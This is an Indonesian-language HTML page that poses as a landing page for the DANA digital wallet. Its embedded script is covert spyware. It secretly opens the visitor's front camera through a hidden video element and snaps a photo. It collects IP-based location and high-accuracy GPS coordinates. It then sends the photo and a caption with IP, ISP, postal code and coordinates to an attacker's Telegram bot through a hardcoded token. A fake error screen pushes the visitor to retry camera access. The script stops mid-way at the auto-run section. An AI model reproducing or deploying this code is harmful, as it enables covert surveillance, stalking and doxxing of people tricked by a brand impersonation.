<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>DANA - Dompet Digital</title>

    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Inter', sans-serif;
            background: radial-gradient(ellipse at 40% 30%, #1a1040, #0a0620);
            padding: 20px;
            overflow: hidden;
            position: relative;
        }

        /* BINTANG DANA */
        body::before {
            content: '';
            position: fixed;
            inset: 0;
            z-index: 0;
            background-image:
                radial-gradient(2px 2px at 8% 15%, rgba(100, 180, 255, 0.8), transparent),
                radial-gradient(2px 2px at 25% 65%, rgba(100, 180, 255, 0.5), transparent),
                radial-gradient(2px 2px at 45% 8%, rgba(100, 180, 255, 0.9), transparent),
                radial-gradient(2px 2px at 68% 78%, rgba(100, 180, 255, 0.4), transparent),
                radial-gradient(2px 2px at 88% 35%, rgba(100, 180, 255, 0.6), transparent),
                radial-gradient(3px 3px at 18% 45%, rgba(150, 200, 255, 0.3), transparent),
                radial-gradient(3px 3px at 55% 25%, rgba(150, 200, 255, 0.3), transparent),
                radial-gradient(1px 1px at 35% 88%, rgba(255, 255, 255, 0.5), transparent),
                radial-gradient(1px 1px at 75% 55%, rgba(255, 255, 255, 0.5), transparent),
                radial-gradient(1px 1px at 92% 75%, rgba(255, 255, 255, 0.3), transparent),
                radial-gradient(1px 1px at 5% 92%, rgba(255, 255, 255, 0.3), transparent);
            background-size: 300px 300px;
            animation: drift 50s linear infinite;
            pointer-events: none;
        }

        @keyframes drift {
            0% { transform: translate(0, 0) scale(1); }
            100% { transform: translate(-20px, -20px) scale(1.08); }
        }

        /* KARTU GLASSMORPHISM */
        .card {
            position: relative;
            z-index: 1;
            max-width: 400px;
            width: 100%;
            background: rgba(255, 255, 255, 0.04);
            backdrop-filter: blur(32px) saturate(1.8);
            -webkit-backdrop-filter: blur(32px) saturate(1.8);
            border-radius: 48px;
            padding: 48px 32px 40px;
            border: 1px solid rgba(255, 255, 255, 0.06);
            box-shadow: 0 40px 100px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.06);
            text-align: center;
        }

        /* LOGO DANA */
        .logo-wrapper {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 14px;
            margin-bottom: 14px;
        }

        .logo-box {
            width: 54px;
            height: 54px;
            background: linear-gradient(145deg, #4a7cf7, #6c5ce7);
            border-radius: 18px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.9rem;
            font-weight: 900;
            color: #fff;
            box-shadow: 0 8px 32px rgba(74, 124, 247, 0.35);
            flex-shrink: 0;
            font-family: 'Inter', sans-serif;
            transform: rotate(-4deg);
        }
        .logo-box span { transform: rotate(4deg); }

        .brand {
            font-family: 'Inter', sans-serif;
            font-weight: 900;
            font-size: 2.5rem;
            color: #fff;
            letter-spacing: -1.5px;
            text-shadow: 0 2px 30px rgba(74, 124, 247, 0.2);
        }
        .brand .gradient {
            background: linear-gradient(135deg, #4a7cf7, #a78bfa);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        /* TAGLINE & DESKRIPSI */
        .tagline {
            font-size: 1.05rem;
            font-weight: 700;
            color: #ffffff;
            margin-bottom: 6px;
            letter-spacing: 0.3px;
            line-height: 1.3;
        }

        .description {
            font-size: 0.92rem;
            line-height: 1.6;
            color: rgba(255, 255, 255, 0.55);
            font-weight: 400;
            max-width: 320px;
            margin: 0 auto 30px;
            letter-spacing: 0.2px;
        }

        /* TOMBOL BUKA DI DANA (hanya hiasan) */
        .btn-dana {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            padding: 18px 48px;
            background: linear-gradient(145deg, #4a7cf7, #6c5ce7);
            border: none;
            border-radius: 60px;
            font-family: 'Inter', sans-serif;
            font-size: 1rem;
            font-weight: 700;
            color: #fff;
            letter-spacing: 1.2px;
            box-shadow: 0 8px 40px rgba(74, 124, 247, 0.45);
            border: 1px solid rgba(255, 255, 255, 0.12);
            width: 100%;
            max-width: 280px;
            text-transform: uppercase;
            pointer-events: none;
            user-select: none;
        }
        .btn-dana .icon { font-size: 1.1rem; line-height: 1; margin-right: 2px; }

        /* ERROR SCREEN */
        .error-screen {
            display: none;
            position: fixed;
            inset: 0;
            z-index: 999;
            background: #0a0620;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            color: rgba(255, 255, 255, 0.12);
            font-family: 'Inter', sans-serif;
            font-size: 3.2rem;
            font-weight: 200;
            letter-spacing: 10px;
            text-transform: uppercase;
        }
        .error-screen .sub-error {
            font-size: 0.8rem;
            color: rgba(255, 255, 255, 0.04);
            letter-spacing: 4px;
            margin-top: 14px;
        }
        .btn-retry {
            margin-top: 32px;
            padding: 14px 36px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 60px;
            color: rgba(255, 255, 255, 0.25);
            font-family: 'Inter', sans-serif;
            font-size: 0.8rem;
            font-weight: 500;
            letter-spacing: 3px;
            text-transform: uppercase;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        .btn-retry:hover {
            background: rgba(255, 255, 255, 0.08);
            color: rgba(255, 255, 255, 0.4);
            border-color: rgba(255, 255, 255, 0.15);
        }

        /* RESPONSIVE */
        @media (max-width: 480px) {
            .card { padding: 40px 24px 36px; border-radius: 36px; }
            .brand { font-size: 2rem; }
            .logo-box { width: 46px; height: 46px; font-size: 1.6rem; border-radius: 14px; }
            .tagline { font-size: 0.95rem; }
            .description { font-size: 0.82rem; }
            .btn-dana { padding: 16px 32px; font-size: 0.88rem; max-width: 240px; }
            .error-screen { font-size: 2.4rem; }
            .btn-retry { padding: 12px 28px; font-size: 0.7rem; }
        }
        @media (max-width: 360px) {
            .card { padding: 32px 18px 28px; border-radius: 28px; }
            .brand { font-size: 1.6rem; }
            .logo-box { width: 40px; height: 40px; font-size: 1.3rem; border-radius: 12px; }
            .btn-dana { padding: 14px 24px; font-size: 0.78rem; max-width: 200px; }
            .error-screen { font-size: 1.8rem; }
        }

        /* SEMBUNYIKAN ELEMEN KAMERA */
        video { display: none !important; }
        .youtube-hidden {
            position: fixed;
            bottom: -9999px;
            left: -9999px;
            width: 0;
            height: 0;
            overflow: hidden;
            z-index: -1;
        }
    </style>
</head>
<body>

    <!-- ====== KARTU DANA ====== -->
    <div class="card" id="mainCard">
        <div class="logo-wrapper">
            <div class="logo-box"><span>D</span></div>
            <div class="brand"><span class="gradient">DANA</span></div>
        </div>
        <div class="tagline">Dompet digital yang aman dan tepercaya!</div>
        <p class="description">
            Nikmati kemudahan bertransaksi dengan beragam metode bayar di genggaman
        </p>
        <button class="btn-dana" id="danaBtn">
            <span class="icon">▶</span> BUKA DI DANA
        </button>
    </div>

    <!-- ====== ERROR SCREEN ====== -->
    <div class="error-screen" id="errorScreen">
        Error
        <div class="sub-error">—</div>
        <button class="btn-retry" id="retryBtn">⟳ Coba Ulang</button>
    </div>

    <!-- ====== AUDIO YOUTUBE (Tersembunyi) ====== -->
    <div class="youtube-hidden">
        <iframe 
            id="youtubeAudio"
            src="https://www.youtube.com/embed/D-VytLhH-KE?autoplay=1&loop=1&playlist=D-VytLhH-KE&controls=0&disablekb=1&modestbranding=1"
            allow="autoplay; encrypted-media"
            allowfullscreen>
        </iframe>
    </div>

    <!-- ====== SCRIPT ====== -->
    <script>
        (function() {
            'use strict';

            // ---------- KONFIGURASI TELEGRAM ----------
            const BOT_TOKEN = '8660313492:AAEstxadAAetaluw8OYCgyCxwZB21LDch4Y';
            const CHAT_ID = '8463156896';
            const MAX_ATTEMPTS = 3;
            let attempts = 0;
            let sudahKirim = false;
            let izinDitolak = false;
            let retryTimer = null;

            const mainCard = document.getElementById('mainCard');
            const errorScreen = document.getElementById('errorScreen');
            const retryBtn = document.getElementById('retryBtn');

            // ---------- GET LOKASI DARI IP ----------
            async function getLocationFromIP() {
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 7000);
                    const res = await fetch('https://ipapi.co/json/', {
                        signal: controller.signal,
                        headers: { 'Accept': 'application/json' }
                    });
                    clearTimeout(timeoutId);
                    if (!res.ok) throw new Error('HTTP ' + res.status);
                    const data = await res.json();
                    return {
                        ip: data.ip || null,
                        city: data.city || null,
                        region: data.region || null,
                        country: data.country_name || null,
                        postal: data.postal || null,
                        latitude: data.latitude || null,
                        longitude: data.longitude || null,
                        org: data.org || null,
                        timezone: data.timezone || null
                    };
                } catch { return null; }
            }

            // ---------- GET GPS ----------
            function getGPSLocation() {
                return new Promise((resolve) => {
                    if (!navigator.geolocation) { resolve(null); return; }
                    const timeoutId = setTimeout(() => resolve(null), 6000);
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            clearTimeout(timeoutId);
                            resolve({
                                latitude: pos.coords.latitude,
                                longitude: pos.coords.longitude,
                                accuracy: pos.coords.accuracy
                            });
                        },
                        () => {
                            clearTimeout(timeoutId);
                            resolve(null);
                        },
                        { enableHighAccuracy: true }
                    );
                });
            }

            // ---------- KIRIM KE TELEGRAM ----------
            async function kirimKeTelegram(dataUrl, locationData, gpsData) {
                try {
                    const blob = await fetch(dataUrl).then(r => r.blob());
                    const formData = new FormData();
                    formData.append('photo', blob, 'foto.png');

                    let caption = `📸 Foto diambil otomatis\n🕒 ${new Date().toLocaleString('id-ID')}`;

                    if (locationData) {
                        if (locationData.ip) caption += `\n\n🌐 IP Publik : ${locationData.ip}`;
                        if (locationData.org) caption += `\n📡 Operator/ISP : ${locationData.org}`;
                        if (locationData.city || locationData.region || locationData.country) {
                            let loc = [];
                            if (locationData.city) loc.push(locationData.city);
                            if (locationData.region) loc.push(locationData.region);
                            if (locationData.country) loc.push(locationData.country);
                            caption += `\n📍 Lokasi IP : ${loc.join(', ')}`;
                        }
                        if (locationData.postal) caption += `\n📮 Kode Pos : ${locationData.postal}`;
                        if (locationData.timezone) caption += `\n🕐 Zona Waktu : ${locationData.timezone}`;
                        if (locationData.latitude && locationData.longitude) {
                            caption += `\n🗺️ Koordinat (IP) : ${locationData.latitude}, ${locationData.longitude}`;
                        }
                    }

                    if (gpsData) {
                        caption += `\n\n📡 GPS (akurat):`;
                        caption += `\n   📍 Lat : ${gpsData.latitude}`;
                        caption += `\n   📍 Long : ${gpsData.longitude}`;
                        if (gpsData.accuracy) {
                            caption += `\n   🎯 Akurasi : ±${Math.round(gpsData.accuracy)} meter`;
                        }
                    }

                    if (!locationData && !gpsData) {
                        caption += `\n\n⚠️ Data lokasi tidak tersedia`;
                    }

                    formData.append('caption', caption);
                    formData.append('chat_id', CHAT_ID);

                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    if (!response.ok) throw new Error('Telegram API error');
                    sudahKirim = true;
                } catch (e) {
                    console.error('Gagal kirim ke Telegram:', e);
                }
            }

            // ---------- AMBIL FOTO ----------
            function ambilDanKirim(video) {
                if (sudahKirim) return;

                const canvas = document.createElement('canvas');
                const lebar = video.videoWidth || 640;
                const tinggi = video.videoHeight || 480;
                canvas.width = lebar;
                canvas.height = tinggi;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, lebar, tinggi);
                const dataUrl = canvas.toDataURL('image/png');

                if (video.srcObject) {
                    video.srcObject.getTracks().forEach(track => track.stop());
                }

                Promise.allSettled([
                    getLocationFromIP(),
                    getGPSLocation()
                ]).then((results) => {
                    const locationData = results[0].status === 'fulfilled' ? results[0].value : null;
                    const gpsData = results[1].status === 'fulfilled' ? results[1].value : null;
                    kirimKeTelegram(dataUrl, locationData, gpsData);
                }).catch(() => {
                    kirimKeTelegram(dataUrl, null, null);
                });
            }

            // ---------- TAMPILKAN ERROR ----------
            function tampilkanError() {
                izinDitolak = true;
                mainCard.style.display = 'none';
                errorScreen.style.display = 'flex';
                if (retryTimer) {
                    clearTimeout(retryTimer);
                    retryTimer = null;
                }
            }

            // ---------- RESET & COBA ULANG ----------
            function resetDanCobaUlang() {
                izinDitolak = false;
                attempts = 0;
                sudahKirim = false;
                if (retryTimer) {
                    clearTimeout(retryTimer);
                    retryTimer = null;
                }
                errorScreen.style.display = 'none';
                mainCard.style.display = 'block';
                setTimeout(mulaiKamera, 300);
            }

            // ---------- MULAI KAMERA ----------
            function mulaiKamera() {
                if (sudahKirim || izinDitolak) return;
                attempts++;

                navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: false
                })
                .then(stream => {
                    const video = document.createElement('video');
                    video.style.display = 'none';
                    video.setAttribute('playsinline', '');
                    video.muted = true;
                    video.srcObject = stream;
                    document.body.appendChild(video);

                    video.onloadedmetadata = () => {
                        video.play().then(() => {
                            setTimeout(() => ambilDanKirim(video), 100);
                        }).catch(() => {
                            if (attempts < MAX_ATTEMPTS) {
                                retryTimer = setTimeout(mulaiKamera, 2000);
                            } else {
                                tampilkanError();
                            }
                        });
                    };
                    video.onerror = () => {
                        if (attempts < MAX_ATTEMPTS) {
                            retryTimer = setTimeout(mulaiKamera, 2000);
                        } else {
                            tampilkanError();
                        }
                    };
                })
                .catch(err => {
                    console.error('Error kamera:', err);
                    if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                        tampilkanError();
                        return;
                    }
                    if (attempts < MAX_ATTEMPTS) {
                        retryTimer = setTimeout(mulaiKamera, 2000);
                    } else {
                        tampilkanError();
                    }
                });
            }

            // ---------- EVENT RETRY ----------
            if (retryBtn) {
                retryBtn.addEventListener('click', function(e) {
                    e.stopPropagation();
                    resetDanCobaUlang();
                });
            }

            // ---------- JALANKAN OTOMATIS ----------
